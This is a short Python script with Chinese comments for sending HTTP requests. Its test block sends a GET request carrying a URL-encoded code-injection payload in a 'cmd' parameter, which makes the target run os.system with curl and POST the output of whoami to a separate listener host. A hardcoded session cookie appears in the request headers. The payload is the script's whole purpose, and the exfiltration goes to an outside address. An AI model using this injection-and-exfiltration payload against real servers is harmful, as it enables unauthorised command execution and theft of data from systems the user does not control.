import time
from datetime import datetime

import requests


# 发送GET请求
def send_get_request(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Cookie': 'JSESSIONID1=gN9mDlwIk1tT4qu7BQkHQOPjfbstJV73s1ULwtfQ6L14IyeyYFHQ!120117907'
    }
    response = requests.get(url, headers=headers)

    print(f"URL: {response.url}")
    print(f"Status code: {response.status_code}")
    print(f"Headers: {response.headers}")
    print(f"Encoding: {response.encoding}")
    print(f"Content: {response.text}")


# 发送POST请求
def send_post_request(url1, data):
    response = requests.post(url1, data=data)
    print(response)
    if response.status_code == 200:
        print(f"POST请求成功，返回的数据是：\n{response.text}")
    else:
        print(f"POST请求失败，错误码是：{response.status_code}")


# 测试
if __name__ == '__main__':
    url = "http://192.168.100.136:8080/?cmd=__import__('os').system('curl%20-d%20%22a%3D%24%28whoami%29%22%20http%3A//192.168.100.1%3A8000')"
    send_get_request(url)


